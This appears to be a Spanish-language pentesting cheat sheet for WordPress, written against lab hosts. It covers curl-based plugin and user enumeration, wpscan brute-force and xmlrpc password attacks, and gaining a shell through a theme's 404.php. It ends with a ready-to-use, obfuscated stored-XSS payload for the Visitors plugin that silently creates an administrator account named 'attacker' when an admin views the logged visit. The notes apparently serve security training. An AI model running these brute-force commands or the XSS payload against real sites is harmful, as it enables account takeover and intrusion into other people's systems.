## Las siguientes técnicas no son concluyentes y se necesita un recorrido manual para encontrar más información y plugins.


#### Passive plugins enumeration

    curl -s -X GET http://página | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2


Tener en cuenta que cada plugin tiene un readme que se encuentra en:

        /wp-content/plugins/<plugin-name>/readme.txt
        
#### Passive themes enumeration

    curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2


#### User Enumeration

Listar de a un usuario:

    curl -s -I -X GET http://blog.inlanefreight.com/?author=1

O la lista de usuarios en un json:

    curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq



### WPSCAN

#### Enumerar todo el sitio y plugins:
        wpscan -url "" --enumerate  --api-token <api-token>
#### Enumerar plugins de manera agresiva:
        wpscan -url "" --enumerate ap --plugins-detection agressive --api-token <api-token>
        
#### BF:
        wpscan -url "" --usernames "" --passwords "dictio"

también puede hacerse:

        sudo wpscan --password-attack xmlrpc -t 20 -U <user> -P <dictio> --url <sitio>

### Metasploit

    auxiliary/scanner/http/wordpress_scanner

### Explotar una WP desde la página de error 404
#### Acceder a la pagina php con la shell
        http://"ip o url"/wp-content/themes/"tema"/404.php

si la reverse shell es la monkey, para migrar a una shell más estable:
        python -c 'import pty;pty.spawn("/bin/bash")' 


### Crear un plugin malicioso con reverseshell

    https://github.com/wetw0rk/malicious-wordpress-plugin

### Exploit visitors plugin

EL plugin visitors de wp tiene una falta de sanitización en el user-agent permitiendo un stored xss. Con el siguiente comando podemos generar una visita que, al ser vista por un admin, triguerea la creación de un user administrador.

User: attacker pass: attackerpass

    curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
